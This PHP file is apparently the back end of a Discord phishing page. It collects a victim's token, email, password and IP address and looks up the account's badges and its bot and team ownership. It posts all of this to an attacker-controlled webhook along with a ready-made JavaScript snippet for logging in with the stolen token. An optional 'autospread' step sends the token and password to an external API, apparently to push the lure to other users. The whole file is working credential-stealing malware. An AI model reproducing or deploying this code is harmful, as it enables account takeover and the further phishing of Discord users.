<?php
function getinfo($token, $url){
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: '.$token));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

    $result        =  curl_exec($ch);
    $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

    curl_close($ch);

    $body      =  substr($result, $headers_size);
    $response  =  json_decode($body);
    $response  =  json_decode(json_encode($response), true);

    return $result;
    
}

function getbadges($token, $login, $password, $client_ip) {

    require 'config.php';

    $TeamOwner     =  'Err';
    $BOT_Verify    =  'Err';

    $json_response =  json_decode(getinfo($token, "https://discordapp.com/api/v9/users/@me"), true);

    $userid        =  $json_response['id'];
    $username      =  $json_response['username'];
    $disc          =  $json_response['discriminator'];
    $avatar        =  $json_response['avatar'];
    $nitroT        =  $json_response['premium_type'];
    $howmuchbadges =  0;
    $badges        =  '';
    

    if(isset($json_response['discriminator']) && isset($json_response['username'])) {
        $public_flags = $json_response['public_flags'];

        $flags = array (
            262144 => "$MOD",
            131072 => "$DEV",
            16384 => "$BUGHUNTER2",
            1024 => 'Team Owner',
            512 => "$EARLY",
            256 => "$BALANCE",
            128 => "$BRILLIANCE",
            64 => "$BRAVERY",
            8 => "$BUGHUNTER1",
            4 => "$HYPESQUAD",
            2 => "$PARTNER",
            1 => "$STAFF"
        );

        $str_flags = array();

        while($public_flags != 0)
        {
            foreach($flags as $key => $value)
            {
                if($public_flags >= $key)
                {
                    array_push($str_flags,$value);
                    $public_flags = $public_flags - $key;
                }
            }
        }
    }

    foreach($str_flags as $item)
        {
            if ($item != 'Hypesquad Online House 1' and $item != 'Hypesquad Online House 2' and $item != 'Hypesquad Online House 3')
            {
                if ($item == 'Verified Developer')
                {

                    $json_response_bot = json_decode(getinfo($token, "https://discord.com/api/v9/applications?with_team_applications=true"), true);

                    foreach($json_response_bot as $item2)
                    {
                        if (json_encode($item2['verification_state']) == '4')
                        {
                            if (json_encode($item2['owner']['id']) == $userid)
                            {
                              $BOT_Verify = 'Bot Owner';
                            }
                        }
                    }

                    $json_response_team = json_decode(getinfo($token, "https://discord.com/api/v9/teams"), true);

                    foreach($json_response_team as $item3)
                    {
                        if (json_encode($item3['owner_user_id']) == $userid)
                        {
                            $TeamOwner = 'Team Owner';
                        }
                    }

                    if ($TeamOwner != 'Err' and $BOT_Verify == 'Err')
                    {
                        $item = (string)$item.'(Team Owner)';
                    }
                    elseif($TeamOwner == 'Err' and $BOT_Verify != 'Err')
                    {
                        $item = (string)$item.'(Bot Owner)';
                    }
                    elseif($TeamOwner != 'Err' and $BOT_Verify != 'Err')
                    {
                        $item = (string)$item.'(Team Owner, Bot Owner)';
                    }

                    if ($howmuchbadges == 0)
                    {
                        $badges = $item;
                    }
                    else
                    {
                        $badges = $badges.'  '.$item;
                    }

                    $howmuchbadges += 1;
                }
                else
                {
                    if ($howmuchbadges == 0)
                    {
                        $badges = $item;
                    }
                    else
                    {
                        $badges = $badges.'  '.$item;
                    }

                    $howmuchbadges += 1;
                }
            }
        }
        $timestamp = date("c", strtotime("now"));
        $headers = [ 'Content-Type: application/json; charset=utf-8' ];
        if ($badges == '') {
            $POST = [ 'username' => "$username#$disc","avatar_url" => "https://cdn.discordapp.com/avatars/$userid/$avatar.png?size=4096", 'content' => "@here"
                ,
                "embeds" => [
                    [
                        "title" => "🔑 User Login",
                        "type" => "rich",
                        "description" => "```🌐 URL: $WEBSITE_LINK```",
                        "timestamp" => $timestamp,
                        "color" => hexdec("36393F"),
                        "footer" => [
                            "text" => "Grabbed at",
                            "icon_url" => "https://cdn.discordapp.com/emojis/951526509657600040.webp",
                        ],
                        "thumbnail" => [
                            "url" => "https://cdn.discordapp.com/avatars/$userid/$avatar.png?size=4096"
                        ],
                        "fields" => [
                            [
                                "name" => "**👮🏾‍♂️ ID**", "value" => "`$userid`", "inline" => true
                            ],
                            [
                                "name" => "**👤 Username**", "value" => "`$username#$disc`", "inline" => true
                            ],
                            [
                                "name" => "**📧 Mail**", "value" => "`$login`", "inline" => true
                            ],
                            [
                                "name" => "**🔒 Pass**", "value" => "||$password||",  "inline" => true
                            ],
                            [
                                "name" => "**🛰️ IP-adress**", "value" => "||$client_ip||", "inline" => true
                            ],
                            [
                                "name" => "**✨Amount Of Badges**", "value" => "`$howmuchbadges`", "inline" => true
                            ],
                            [
                                "name" => "**Token:**", "value" => "```$token```", "inline" => false
                            ],
                            [
                                "name" => "🌐 Login Script", "value" => '```js
                                function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50); setTimeout(() => {location.reload(); }, 2500);}'. "login('$token')```", "inline" => true
                            ],
                        ],
                    ],
                ],
        ];
        }
        else {
            $POST = [ 'username' => "$username#$disc","avatar_url" => "https://cdn.discordapp.com/avatars/$userid/$avatar.png?size=4096",  'content' => "@here"
            ,
            "embeds" => [
                [
                    "title" => "🔑 User Login",
                    "type" => "rich",
                    "description" => "```🌐 URL: $WEBSITE_LINK```",
                    "timestamp" => $timestamp,
                    "color" => hexdec("36393F"),
                    "footer" => [
                        "text" => "Grabbed at",
                        "icon_url" => "https://cdn.discordapp.com/emojis/951526509657600040.webp",
                    ],
                    "thumbnail" => [
                        "url" => "https://cdn.discordapp.com/avatars/$userid/$avatar.png?size=4096"
                    ],
                    "fields" => [
                        [
                            "name" => "**👮🏾‍♂️ ID**", "value" => "`$userid`", "inline" => true
                        ],
                        [
                            "name" => "**👤 Username**", "value" => "`$username#$disc`", "inline" => true
                        ],
                        [
                            "name" => "**📧 Mail**", "value" => "`$login`", "inline" => true
                        ],
                        [
                            "name" => "**🔒 Pass**", "value" => "||$password||",  "inline" => true
                        ],
                        [
                            "name" => "**🛰️ IP-adress**", "value" => "||$client_ip||", "inline" => true
                        ],
                        [
                            "name" => "**✨Amount Of Badges**", "value" => "`$howmuchbadges`", "inline" => true
                        ],
                        [
                            "name" => "**Badges:**", "value" => "$badges", "inline" => true
                        ],
                        [
                            "name" => "**Token:**", "value" => "```$token```", "inline" => false
                        ],
                        [
                            "name" => "🌐 Login Script", "value" => '```js
                            function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50); setTimeout(() => {location.reload(); }, 2500);}'. "login('$token')```", "inline" => true
                        ],
                    ],
                ],
            ],
        ];
        }

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $WEBHOOK);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
        if ($SEND_TO_WEBHOOK)
        	$response   = curl_exec($ch);
        if ($AUTOSPREAD)
            $contents = file_get_contents($API_URL.urlencode($token).'/'.urlencode($MESSAGE).'/'.urlencode($password));

}
